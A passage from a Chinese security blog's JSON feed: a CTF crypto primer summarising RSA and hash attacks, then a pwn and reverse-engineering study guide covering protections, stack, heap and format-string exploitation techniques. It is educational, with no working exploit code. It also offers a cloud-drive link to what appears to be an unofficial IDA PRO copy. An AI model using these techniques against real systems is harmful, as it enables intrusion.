序列密码</h4>\n<p>序列密码指将种子密钥通过密钥流生成器产生的伪随机序列与明文简单结合生成密文。其中与明文结合的元素称为密钥流，将产生密钥流元素的部件称为密钥流发生器。序列密码的密码强度主要取决于密钥流发生器的设计。</p>\n<h4 id=\"公钥密码\"><a class=\"anchor\" href=\"#公钥密码\">#</a> 公钥密码</h4>\n<p>前面所讲的密码的加密密钥和解密密钥都是相同的，从公钥密码开始，加密密钥和解密密钥就不是同一个密钥了。其中加密密钥是公开的，解密密钥是保密的，并且很难由加密密钥推出解密密钥。</p>\n<p>说到公钥密码，就不得不提到 RSA，RSA 也是 CTF 比赛中最常出现的公钥密码。</p>\n<h5 id=\"rsa\"><a class=\"anchor\" href=\"#rsa\">#</a> RSA</h5>\n<p>学习 RSA，需要具备一定的数论知识，否则很难理解透彻。</p>\n<p>这里先过一遍 RSA 加密解密的流程。</p>\n<blockquote>\n<p>小红需要给小刚发送一段隐私信息，但他们之间的通讯通道被小明监听着，因此小红不能直接把信息发给小刚。</p>\n<p>于是小刚先挑选两个大素数 <code>p</code>  和 <code>q</code> ，然后相乘得出了 <code>n=p*q</code> ，然后又挑了一个合适的素数 <code>e</code> 。这时小刚把 <code>（n，e）</code> 发送给了小红，当然小明也得知了这个信息。</p>\n<p>小红拿到 <code>（n，e）</code> 后，把隐私信息通过 Hex 和 Padding 转换为一串数字 <code>m</code> ，然后通过计算得到 <code>c（c=m^e mod n）</code> ，然后把 <code>c</code>  发送给了小刚，当然小明也得到了 <code>c</code> 。</p>\n<p>这时，我们观察一下小红、小刚、小明所掌握的信息：</p>\n<ul>\n<li>小红：c、m、e、n</li>\n<li>小刚：c、e、n、p、q</li>\n<li>小明：c、e、n</li>\n</ul>\n<p>当小刚收到小红发送的信息 <code>c</code>  后，通过计算 <code>e</code>  关于 <code>n</code>  的欧拉函数的逆元，求出了 <code>d</code> ，然后通过 <code>d</code>  进行计算就可以算出 <code>m=c^d mod n</code> ，再通过 Hex 的处理就得到了小红发送的隐私信息。而小明没有掌握 <code>p和q</code> ，就无法计算出 <code>d</code> ，从而无法解密 <code>c</code>  来获取 <code>m</code> 。</p>\n<p>在上面这个过程中（n，e）就是公钥，（n，d）就是私钥。</p>\n</blockquote>\n<p>下面列出了公、私钥的生成算法和加密解密算法</p>\n<blockquote>\n<p>公、私钥的生成：</p>\n<ol>\n<li>随机选择两个不同大素数 p 和 q，计算 N=p*q。</li>\n<li>根据欧拉函数，求得 φ(N)=φ(p)φ(q)=(p-1)(q-1)。</li>\n<li>选择一个小于 φ(N) 的整数 e，使 e 和 φ(N) 互质。并求得 e 关于 φ(N) 的模反元素，命名为 d，有 ed≡1 (mod φ(N))。</li>\n</ol>\n<p>此时，(N,e) 是公钥，(N,d) 是密钥。</p>\n</blockquote>\n<blockquote>\n<p>信息加密：</p>\n<ol>\n<li>\n<p>先将信息以一个双方约定好的格式转化为一个小于 N，且于 N 互质的整数 m。</p>\n</li>\n<li>\n<p>对 m 利用如下公式加密</p>\n<p>m^e≡c (mod N)</p>\n</li>\n</ol>\n</blockquote>\n<blockquote>\n<p>信息解密：</p>\n<p>利用密钥 d 按照如下公式进行解密</p>\n<p>​\t\tc^d≡m (mod N)</p>\n</blockquote>\n<h5 id=\"rsa算法的攻击\"><a class=\"anchor\" href=\"#rsa算法的攻击\">#</a> RSA 算法的攻击</h5>\n<ul>\n<li>\n<p>直接模数分解</p>\n<blockquote>\n<p>正常情况下，攻击者并不知道 p 和 q，因此无法计算出私钥 d 来破解加密信息 m。</p>\n<p>但是如果 n 的取值过小，攻击者可以通过爆破的手段分解得到 p 和 q，从而破解出密文。</p>\n</blockquote>\n</li>\n<li>\n<p>费马分解和 Pollard_rho 分解</p>\n<blockquote>\n<p>当 n 的取值过小时，可以通过直接模数分解得到 p 和 q。但即使 n 的取值很大，而 p 和 q 差距过远或者差距过小时，也会产生问题。</p>\n<p>其中费马分解适用于 p 和 q 差距过小的情况，Pollard_rho 分解适用于 p 和 q 差距过大的情况。</p>\n</blockquote>\n</li>\n<li>\n<p>公约数模数分解</p>\n<blockquote>\n<p>如果在进行了两次信息传递时，使用的两个大素数 p 和 q 有一个是相等的，攻击者就可以通过对两次通信的 n 进行求公约数的计算进而分解出两次通信的 n，即 n1 和 n2。n1 和 n2 具有一个共同的素因子 p，这是通过 n1、n2 分别去除素因子 p 就可以分解出两次使用的素数 q1 和 q2，然后可以解密了。</p>\n</blockquote>\n</li>\n<li>\n<p>小指数明文爆破</p>\n<blockquote>\n<p>如果生成公钥时使用的 e 太小，并且要传输的信息也很小时，就会出现 m<sup>e＜n 的情况，这时直接对 c 开 e 次根号就可以得到明文 m。如果 m</sup>e＞n 但没有超过 n 太多，即 k*n＜m<sup>e＜(k+1)*n，当 k 处于可以爆破的大小时，可以通过关系式 k*n-c=m</sup>e 来爆破明文。</p>\n</blockquote>\n</li>\n<li>\n<p>选择明文攻击</p>\n<blockquote>\n<p>如果可以对任意密文解密，但不能对 C 解密，可以求出 C 的 N 上 d 的逆元 C<sup>-1，然后求 C</sup>-1 的明文 M'。M' 即为明文的逆元，再次求逆即可。</p>\n</blockquote>\n</li>\n<li>\n<p>LLL-attack</p>\n<blockquote>\n<p>在已知 e 且 e 较小的情况下，如果已经泄露了一部分密文（例如在信息开头打招呼），或者泄露了 p 或 q 的一部分，又或者是直接泄露了一部分明文的 bit，当泄露的信息长度足够时，可以通过 Coppersmith method 的方法求得明文。</p>\n</blockquote>\n</li>\n<li>\n<p>Wiener Attack &amp; Boneh Durfee Attack</p>\n<blockquote>\n<p>如果 e 很大但生成的 d 过下，也会被成功攻击，即 RSA Wiener Attack。</p>\n</blockquote>\n</li>\n<li>\n<p>共模攻击</p>\n<blockquote>\n<p>如果在两次通讯中使用了相同的 n，并且是对相同的 m 加密，那么可以不计算 d 直接计算出 m 的值。</p>\n<p>即当又两组及以上的 RSA 加密过程，其中两次的 m 和 n 都是相同的，就可以通过计算直接计算出 m。</p>\n</blockquote>\n</li>\n<li>\n<p>广播攻击</p>\n<blockquote>\n<p>在连续进行 RSA 加密时，如果选择的加密指数 e 较小，并且每次加密的信息都是相同的，可以通过中国剩余定理计算出一个数 c<sup>e，这时对 c</sup>e 开 e 次根号就可以得到 m。</p>\n</blockquote>\n</li>\n<li>\n<p>相关消息攻击</p>\n<blockquote>\n<p>如果用同一公钥对两个具有某种线性关系的消息 m1 和 m2 进行加密。当 e 比较小时，就可以根据加密后的 c1 和 c2 九三出相应的 m1 和 m2.</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"哈希\"><a class=\"anchor\" href=\"#哈希\">#</a> 哈希</h4>\n<p>哈希，也叫散列，可以把任意长度的输入，变换成固定长度的输出，输出结果即为哈希值。这种转换是一种压缩映射，即哈希值的空间通常远小于输入的空间，导致不同的输入可能会拥有相同的哈希值，所以不能通过哈希值来唯一确定输入值。。</p>\n<p>哈希函数有很多，常见的有 MD5、sha1、sha256 等。</p>\n<h5 id=\"哈希函数的攻击\"><a class=\"anchor\" href=\"#哈希函数的攻击\">#</a> 哈希函数的攻击</h5>\n<ul>\n<li>\n<p>哈希碰撞（暴力攻击）</p>\n<blockquote>\n<p>不依赖于任何算法细节，暴力破解明文，仅与 Hash 值长度有关。</p>\n</blockquote>\n</li>\n<li>\n<p>哈希长度扩展攻击</p>\n<blockquote>\n<p>在计算 hash 的方式 secret+message 为明文的情况下，可以进行哈希长度扩展攻击，使攻击者可以在不知道 secret 的情况下修改 message 并得到另外一个 hash 值。</p>\n</blockquote>\n</li>\n</ul>\n",
            "tags": [
                "Crypto"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2021/12/pwn&reserve-start/",
            "url": "https://www.coldwinds.top/2021/12/pwn&reserve-start/",
            "title": "二进制（pwn、reverse）学习方向",
            "date_published": "2021-12-11T15:45:55.000Z",
            "content_html": "<h1 id=\"0x00-安全素养\"><a class=\"anchor\" href=\"#0x00-安全素养\">#</a> 0x00 安全素养</h1>\n<h2 id=\"网络安全法\"><a class=\"anchor\" href=\"#网络安全法\">#</a> 网络安全法</h2>\n<p><strong>不要违法，不要违法，不要违法。</strong></p>\n<p><strong>参考资料：</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQjglQUQlRTUlOEQlOEUlRTQlQkElQkElRTYlQjAlOTElRTUlODUlQjElRTUlOTIlOEMlRTUlOUIlQkQlRTclQkQlOTElRTclQkIlOUMlRTUlQUUlODklRTUlODUlQTglRTYlQjMlOTU=\">https://baike.baidu.com/item/ 中华人民共和国网络安全法</span></p>\n<h1 id=\"0x01-基础\"><a class=\"anchor\" href=\"#0x01-基础\">#</a> 0x01 基础</h1>\n<p>编程和逆向工程的能力是<strong>相当重要</strong>的。</p>\n<h2 id=\"编程语言功底\"><a class=\"anchor\" href=\"#编程语言功底\">#</a> 编程语言功底</h2>\n<ul>\n<li>\n<p>精通 C 语言（指针、函数）、C++</p>\n</li>\n<li>\n<p>汇编语言（熟悉常见指令及寄存器等，能够熟练阅读汇编代码）</p>\n</li>\n<li>\n<p>熟练使用 python</p>\n</li>\n</ul>\n<h2 id=\"逆向功底底层原理\"><a class=\"anchor\" href=\"#逆向功底底层原理\">#</a> 逆向功底 &amp; 底层原理</h2>\n<ul>\n<li>\n<p>IDA PRO 的使用（或者 Ghidra 等其它工具）</p>\n</li>\n<li>\n<p>gdb 的基本使用（断点、单步、查看内存等）</p>\n</li>\n</ul>\n<ul>\n<li>《程序员的自我修养》\n<ul>\n<li>程序的编译链接原理</li>\n<li>内存管理</li>\n<li>进程地址空间</li>\n<li>函数调用惯例</li>\n<li>…</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>…</li>\n</ul>\n<h1 id=\"0x02-二进制安全\"><a class=\"anchor\" href=\"#0x02-二进制安全\">#</a> 0x02 <strong>二进制安全</strong></h1>\n<h2 id=\"ctf\"><a class=\"anchor\" href=\"#ctf\">#</a> CTF</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcv\">https://ctf-wiki.org/</span></p>\n<p>先从 CTF 入手，学习各种漏洞类型及利用手法，不断刷题、阅读，大一大二专注在 CTF 比赛中，要求能够解决大部分常规难度的题目。</p>\n<p>学习新的题目时，不要先看 wp，要先自己去找漏洞，找漏洞是最重要的，漏洞的利用上可以跟着 wp 一步一步调试。</p>\n<p>这里有一些刷题平台：</p>\n<ul>\n<li><strong><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi8=\">https://buuoj.cn/</span></strong></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tLw==\">https://ctf.bugku.com/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmaHViLmNvbS8jL2luZGV4\">https://www.ctfhub.com/#/index</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuLw==\">https://adworld.xctf.org.cn/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wd25hYmxlLnR3Lw==\">https://pwnable.tw/</span></li>\n</ul>\n<h3 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h3>\n<h4 id=\"配置环境\"><a class=\"anchor\" href=\"#配置环境\">#</a> 配置环境</h4>\n<p>CTF 中接触到的 PWN 题大多属于 LINUX PWN，给电脑装 LINUX 系统比较麻烦，一般情况下是装虚拟机。</p>\n<p>如果想跳过配置环境这一步，可以直接使用 KALI LINUX，但还是建议自己装一次环境（日后可能会需要下载安装一些工具，需要会 LINUX 系统的操作）。</p>\n<p>可以参考我的另一篇文章：</p>\n<p><div class=\"links\"><div class=\"item\" title=\"Coldwinds\" style=\"--block-color:#9d5b8b;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jb2xkd2luZHM1MTY3LmdpdGh1Yi5pby8yMDIxLzEyL3B3bi1lbnZpcm9ubWVudC8=\" data-background-image=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/avatar.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jb2xkd2luZHM1MTY3LmdpdGh1Yi5pby8yMDIxLzEyL3B3bi1lbnZpcm9ubWVudC8=\">冷风喧嚣</span>\n          <p class=\"desc\">pwn环境搭建</p>\n          </div></div></div></p>\n<h4 id=\"基本工具\"><a class=\"anchor\" href=\"#基本工具\">#</a> 基本工具</h4>\n<h5 id=\"逆向辅助类\"><a class=\"anchor\" href=\"#逆向辅助类\">#</a> 逆向辅助类</h5>\n<ul>\n<li>\n<p><strong>IDA PRO</strong></p>\n<blockquote>\n<p>IDA PRO 是一款很好用的反汇编工具，其反编译插件在很多时候能够将代码还原到接近源码的水平，但是 IDA 的使用比较复杂，需要自己学习。</p>\n</blockquote>\n<blockquote>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMVpOOEtkMlFicG5QNXFtMVFCZnhhSUE=\">https://pan.baidu.com/s/1ZN8Kd2QbpnP5qm1QBfxaIA</span><br />\n 提取码：j2my</p>\n</blockquote>\n</li>\n<li>\n<p><strong>GDB</strong></p>\n<blockquote>\n<p>GDB 是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中链表的状态，各个地址的内容。GDB 拥有多个插件（peda、pwndbg、gef 等）这些插件提供了一些额外的命令，在可视化和功能上都进行了扩展。</p>\n<p>推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"漏洞利用类\"><a class=\"anchor\" href=\"#漏洞利用类\">#</a> 漏洞利用类</h5>\n<p>这一类工具几乎都可以在<strong> GITHUB</strong> 上下载。</p>\n<ul>\n<li>\n<p><strong>pwntools</strong></p>\n<blockquote>\n<p>pwntools 是一个 CTF 框架和漏洞利用开发库，涵盖了 pwn 题利用脚本所需要的各种工具。包括方便的 IO 交互函数，ROP、格式化字符串等利用的自动化工具，shellcode 生成器等等，是目前最好用也是仅有的大型 pwn 利用框架。能节省大量编写脚本的时间。</p>\n</blockquote>\n</li>\n<li>\n<p>ZIO</p>\n<blockquote>\n<p>ZIO 是一个专门为 CTF PWN 开发的 Python 库，基于 ZIO 可以方便实现对远程服务器上的服务程序进行数据读写操作，也支持对本地程序的数据读写操作。</p>\n</blockquote>\n</li>\n<li>\n<p>ROPgadget</p>\n<blockquote>\n<p>ROP 是一种高级的内存攻击技术，常用来绕过现代操作系统的各种通用防御。Ropgadget 用于找寻程序中用来组装 ROP 链的 gadget。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>checksec</strong></p>\n<blockquote>\n<p>查询程序架构和保护机制的开启状况。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>one_gadget</strong></p>\n<blockquote>\n<p>分析定位 libc 中获取 shell 的地址，在满足特定条件的情况下，仅拥有该地址就可以 get shell。而非手动输入 /bin/sh 和 system 的地址。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>seccomp-tools</strong></p>\n<blockquote>\n<p>分析程序中的 seccomp 安全机制开启的具体情况。</p>\n</blockquote>\n</li>\n<li>\n<p>...</p>\n</li>\n</ul>\n<h4 id=\"保护机制\"><a class=\"anchor\" href=\"#保护机制\">#</a> 保护机制</h4>\n<h5 id=\"系统选项\"><a class=\"anchor\" href=\"#系统选项\">#</a> 系统选项</h5>\n<p>ASLR：地址空间随机化 (系统选项)</p>\n<blockquote>\n<p>ASLR 有三个等级，对应系统文件中的三个值。</p>\n<p>0：关闭 ASLR。</p>\n<p>1：mmap base、stack、vdso page 将随机化，“.so” 文件会被加载到随机地址，程序的代码段加载地址将被随机化。</p>\n<p>2：在 1 的基础上增加了 heap 随机化。</p>\n<p>ASLR 保证每次程序加载的时候自身和所加载的库文件都会被映射到虚拟地址空间的不同地址处。</p>\n</blockquote>\n<h5 id=\"编译选项\"><a class=\"anchor\" href=\"#编译选项\">#</a> 编译选项</h5>\n<ul>\n<li>\n<p>NX：堆栈不可执行</p>\n<blockquote>\n<p>主要防止程序直接在非可执行的内存区（堆和栈）上运行 shellcode 代码。</p>\n</blockquote>\n</li>\n<li>\n<p>PIE：程序基地址随机化</p>\n<blockquote>\n<p>程序每个段加载出来的基地址都是随机化的。</p>\n</blockquote>\n</li>\n<li>\n<p>RELRO：重定位</p>\n<blockquote>\n<p>一般分为 partial relro 和 full relro 两种情况，前者重定位信息可写（如 GOT 表），后者不可写。</p>\n</blockquote>\n</li>\n<li>\n<p>STACK CANARY：栈溢出保护</p>\n<blockquote>\n<p>在栈的缓冲区和控制信息（如 EBP 等）间插入一个 canary word。这样，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击，从而保护程序因为栈溢出而被攻击。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"常见漏洞\"><a class=\"anchor\" href=\"#常见漏洞\">#</a> 常见漏洞</h4>\n<h5 id=\"栈相关漏洞\"><a class=\"anchor\" href=\"#栈相关漏洞\">#</a> 栈相关漏洞</h5>\n<p>学习栈相关漏洞首先要对程序<strong>栈的结构</strong>，<strong>调用机制</strong>，以及函数参数传递规则（函数参数入栈出栈顺序）有一定了解。</p>\n<ul>\n<li>\n<p><strong>栈溢出</strong></p>\n<p>指栈上的缓冲区被填入了过多的数据，超出了边界，从而导致栈上原有的数据被覆盖，如果能让指定内容覆盖到某些位置，就能 get shell，通常覆盖栈的<strong>局部变量</strong>、<strong>bp</strong>（函数栈栈底指针）、<strong>ip</strong>（程序返回地址）。</p>\n<blockquote>\n<p>关于栈溢出有几个需要学习的点：</p>\n<ul>\n<li>\n<p>当开启 NX 和 CANARY 后如何执行栈溢出。</p>\n</li>\n<li>\n<p>覆盖 ip：ip 存放的是返回到父函数调用处的下一个位置，如果通过栈缓冲区用某一地址 a 覆盖了 ip，在该函数结束后，会跳转到 a 地址上，从而劫持控制流。</p>\n</li>\n<li>\n<p>覆盖栈中存储的临时变量：在知道两个变量地址偏移时，可以通过一个变量覆盖另一个变良，从而改变另一个变量。</p>\n</li>\n<li>\n<p>关注一些敏感函数：这些函数能够产生缓冲区溢出，从而实现栈溢出。</p>\n<p>常见的漏洞函数：</p>\n<ul>\n<li>gets(buff)</li>\n<li>scanf(&quot;%s&quot;,buff)</li>\n<li>...</li>\n</ul>\n<p>潜在的漏洞函数：</p>\n<ul>\n<li>read</li>\n<li>strcpy</li>\n<li>memcpy</li>\n<li>...</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"栈相关漏洞的利用\"><a class=\"anchor\" href=\"#栈相关漏洞的利用\">#</a> 栈相关漏洞的利用</h5>\n<ul>\n<li>\n<p>栈的特殊利用</p>\n<ul>\n<li>\n<p>libc 信息泄露：main 函数栈底存放了返回地址，如果能泄露改返回地址，就能计算出 libc 的基址，从而得到其他函数地址。</p>\n</li>\n<li>\n<p>通过 libc 泄露栈地址：在已知 libc 地址的情况下，可以根据 libc 中的 Environ 偏移来计算栈的偏移，从而计算出栈的地址。</p>\n</li>\n<li>\n<p>往栈上写 ROP</p>\n</li>\n<li>\n<p>环境变量修改</p>\n</li>\n<li>\n<p>多级指针</p>\n</li>\n</ul>\n</li>\n<li>\n<p>栈喷射</p>\n<p>在 ROP 时无法找到确定的栈地址，便预先在栈中布置大量重复的 ROP 数据块，只要在返回时位于其中一个数据块就能实现 ROP。</p>\n<blockquote>\n<p>并非必须是 ROP，shellcode、ROP 地址等数据也可以利用栈喷射。</p>\n</blockquote>\n</li>\n<li>\n<p>栈迁移</p>\n<p>溢出的长度太短，尝试改变 sp 和 bp 寄存器的值，在新一段地址上建立栈并写入 rop 链</p>\n</li>\n<li>\n<p>线程栈</p>\n<blockquote>\n<p>现阶段了解一下即可。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"堆相关漏洞堆漏洞是ctf比赛重点\"><a class=\"anchor\" href=\"#堆相关漏洞堆漏洞是ctf比赛重点\">#</a> 堆相关漏洞（堆漏洞是 CTF 比赛重点）</h5>\n<p>堆主要指用户动态申请的内存（如调用 malloc、alloc、alloca 等函数）。</p>\n<p>学习堆相关漏洞需要了解：</p>\n<blockquote>\n<p><strong>堆基本数据结构 chunk</strong>（alloced chunk、free chunk、top chunk）。</p>\n<p><strong>堆空闲块管理结构 bin</strong>（fast bin、unsorted bin、small bin、large bin）。</p>\n<p>malloc、free 函数的基本规则，建议结合源码对照分析。</p>\n<p><strong>tcache</strong> 机制（很重要）。</p>\n</blockquote>\n<ul>\n<li>\n<p>常规堆溢出</p>\n<blockquote>\n<p>与栈溢出类似，在堆上的缓冲区被填入了过多的数据，超出了边界，导致堆中原有的数据被覆盖。通常有以下两种情况：</p>\n<ul>\n<li>覆盖本堆块内部数据：通常发生在结构体内部，如结构体中数组溢出，就会覆盖后续变量。</li>\n<li>覆盖后续堆块数据：不仅影响后续堆块的数据，还破坏了堆块的结构。</li>\n</ul>\n<p>第一种情况，参照栈溢出即可。</p>\n<p>第二种情况，有其他利用方法。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Off By One</strong></p>\n<blockquote>\n<p>相比于常规的堆溢出，Off By One 只能溢出一字节，在 CTF 比赛中，Off By One 通常位于堆块末尾，溢出的一字节恰好能够覆盖下一堆块的 size 域的最低位，Off By One 本身比较难以利用，通常用来触发 Unlink。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Use After Free（UAF）</strong></p>\n<blockquote>\n<p>UAF 即释放后使用漏洞，当堆指针在释放后为被置 NULL，就会形成悬挂指针，在下一次访问该指针时，仍然能够访问到原指针所指向的堆内容。UAF 的利用需要具体问题具体分析，来确定其是否能泄露信息或修改信息。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Double Free</strong></p>\n<blockquote>\n<p>Double Free 主要指对指针存在多次释放的情况，算是 UAF 中比较特殊的一种，针对用于释放堆块的函数。对此释放能够使堆块发生重叠，前后申请的堆块可能会指向同一块内存。还可以构造特殊的堆结构，从而运用针对堆结构的利用方法。</p>\n</blockquote>\n</li>\n<li>\n<p>IO_FILE</p>\n<blockquote>\n<p>IO_FILE 本身并不是漏洞，而是程序执行 fopen 等函数时创建的结构体。在出现 House Of Orange 后，陆续出现了利用 IO_FILE 进行攻击的手法</p>\n<ul>\n<li>FSOP</li>\n<li>Vtable 劫持</li>\n<li>利用缓冲区指针达成任意读写</li>\n<li>…</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"堆相关漏洞的利用\"><a class=\"anchor\" href=\"#堆相关漏洞的利用\">#</a> 堆相关漏洞的利用</h5>\n<ul>\n<li>\n<p>Unlink</p>\n<blockquote>\n<p>Unlink 是把 free 掉的堆块从所属的 bins 链中，卸下来的操作。它是在 free 掉一块 chunk (除 fastbin 的 chunk 外）之后，glibc 检查这块 chunk 相邻的上下两块 chunk 的 free 状态之后，做出的堆块合并引起的。</p>\n<p>Unlink 攻击指的是先伪造堆块，在 free 操作时触发堆块合并，在绕过一系列检测机制后，就可以通过伪造的堆块修改其他堆块的指针，或者实现任意地址写。</p>\n</blockquote>\n</li>\n<li>\n<p>Fastbin Attack</p>\n<blockquote>\n<p>Fastbin Attack 主要针对 fastbin 的使用和释放机制，对 fastbin 的间接利用比较多。</p>\n<p>直接利用 fastbin 的方法主要是针对 fastbin 的单链表结构，更改其后续指针，控制 fastbin 在下次所要分配的堆块。</p>\n</blockquote>\n</li>\n<li>\n<p>House Of Orange</p>\n<blockquote>\n<p>使用 Unsorted Bin Attack 修改 IO_list_all 来获取 shell。</p>\n<p>学习 House Of Orange 需要理解两个概念 ——Unsorted Bin Attack 和 FSOP。</p>\n</blockquote>\n</li>\n<li>\n<p>Large bin attack</p>\n<blockquote>\n<p>覆盖 largebin 中 bk_nextsize 指针，在 largebin 插入 unsorted bin 时，可以做到往任意地址写一个堆地址的效果</p>\n</blockquote>\n</li>\n<li>\n<p>堆喷射</p>\n<blockquote>\n<p>堆喷射主要指在堆块中布置好大量重复性的数据，便于目的地址索引到堆上的数据，与栈喷射相似但更为麻烦，在真实漏洞中利用较多，而在 CTF 比赛中不常出现。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"格式化字符串漏洞\"><a class=\"anchor\" href=\"#格式化字符串漏洞\">#</a> 格式化字符串漏洞</h5>\n<p>格式化字符串漏洞主要是针对一些格式化函数（printf、sprintf、vsprintf 等）。这些格式化函数利用格式化字符串来指定串的格式。下面给出四个比较关键的格式符：</p>\n<blockquote>\n<ul>\n<li>\n<p>% x（% lx）：替换为参数的值（十六进制）。</p>\n</li>\n<li>\n<p>% p：替换为参数的值（指针形式）。</p>\n</li>\n<li>\n<p>% s：替换为参数所指向内存的字符串。</p>\n</li>\n<li>\n<p>% n：将格式化串中该特殊字符之前的字符数量写入参数中（获取地址的参数）。</p>\n</li>\n</ul>\n</blockquote>\n<p>同时还要了解参数定位。</p>\n<blockquote>\n<p>例如：printf (&quot;% p,% x&quot;,&amp;a,&amp;b);  其中的 % p 和 % x 对应第 1、2 个参数。</p>\n<p>也可以使用 &quot;% d$m&quot; 的形式来定位参数列表中第 d 个参数（从 1 开始）；其中 m 是前面所说的格式符（x、p、s、n 等）。</p>\n</blockquote>\n<h5 id=\"格式化字符串的利用\"><a class=\"anchor\" href=\"#格式化字符串的利用\">#</a> 格式化字符串的利用</h5>\n<p>格式化函数遇到格式符的关键字符后，会按照传参规则去寻找参数来进行替换或修改。如果实际参数数量小于所需参数数量，依然会将对应位置的数值当成参数进行转换，从而触发格式化字符串漏洞。</p>\n<ul>\n<li>\n<p>任意地址读</p>\n<blockquote>\n<p>通过前面所说的参数定位 “% d$m”，在确定所需信息在栈中的位置（位于第几个参数），通过参数定位可以将该信息泄露出来。</p>\n</blockquote>\n</li>\n<li>\n<p>任意地址写</p>\n<blockquote>\n<p>主要是利用格式化字符串中的 % n 对参数进行写入，写入的值是格式化字符串中 % n 之前的字符数量。</p>\n<p>% n 修改 4 字节、% hn 修改 2 字节、% hhn 修改 1 字节。</p>\n<p>可以结合 % c 来修改成特定的值，例如 &quot;%100c&quot; 会替换为宽度为 100 的字符。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"整型漏洞\"><a class=\"anchor\" href=\"#整型漏洞\">#</a> 整型漏洞</h5>\n<p>整型漏洞主要指发生在整型数据上的漏洞，整型溢出指试图保存的数据超过整型数据的宽度时发生的溢出。</p>\n<ul>\n<li>\n<p>宽度溢出</p>\n<blockquote>\n<p>整型数据在计算机中的存储一般按字节进行存储，不同的整型数据所需要的字节数也不同，“所需要的字节数” 就是该整型数据的宽度，如果数据所要表达的值大于这个宽度就会发生宽度溢出。</p>\n<p>宽度溢出主要出现在：</p>\n<ul>\n<li>\n<p>整型数据运算</p>\n</li>\n<li>\n<p>整型数据赋值</p>\n</li>\n<li>\n<p>...</p>\n</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>符号转换</p>\n<blockquote>\n<p>符号转化通常用于：</p>\n<ul>\n<li>将无符号数和有符号数进行强制转换后数值相差过大，从而绕过条件判断。</li>\n<li>有些函数对参数有特定要求，但使用时并没有严格按照参数的类型进行参数传递。</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>数组越界</p>\n<blockquote>\n<p>由于检查不严格，导致在对数组内存的索引时超出了数组的预设范围，从而访问到其他数据。</p>\n<p>如果可以显示数组内容，就可以实现信息泄露；如果可以修改数组内容，就可以实现信息修改。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"逻辑漏洞\"><a class=\"anchor\" href=\"#逻辑漏洞\">#</a> 逻辑漏洞</h5>\n<p>逻辑漏洞主要指程序逻辑上出现的问题，当程序逻辑不严密或者逻辑太复杂，就会导致一些逻辑分支不能正常处理或处理错误。在 PWN 题中较少出现，主要是竞态条件漏洞。</p>\n<ul>\n<li>\n<p>竞态条件漏洞</p>\n<blockquote>\n<p>竞态条件漏洞是指多任务（多进程、多线程等）对同一资源进行访问时，因访问资源的先后顺序不同产生冲突的情况，通过竞态条件漏洞可以实现越权访问、资源篡改等操作。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"其他平台漏洞\"><a class=\"anchor\" href=\"#其他平台漏洞\">#</a> 其他平台漏洞</h5>\n<ul>\n<li>IOT 漏洞</li>\n<li>虚拟机漏洞</li>\n<li>内核漏洞</li>\n<li>...</li>\n</ul>\n<h3 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> REVERSE</h3>\n<p>Reverse 即软件逆向工程，是对编译成型的二进制程序进行代码、逻辑和功能分析的过程。在 CTF 中主要考察软件静态分析和动态调试能力，常见的逆向目标为 Windows、Linux 平台下 x86、x64 二进制可执行程序。</p>\n<h4 id=\"能力要求\"><a class=\"anchor\" href=\"#能力要求\">#</a> 能力要求</h4>\n<ul>\n<li>熟悉如操作系统，汇编语言，加解密等相关知识。</li>\n<li>具有丰富的多种高级语言的编程经验。</li>\n<li>熟悉多种编译器的编译原理。</li>\n<li>较强的程序理解和逆向分析能力。</li>\n</ul>\n<h4 id=\"逆向分析的主要方法\"><a class=\"anchor\" href=\"#逆向分析的主要方法\">#</a> 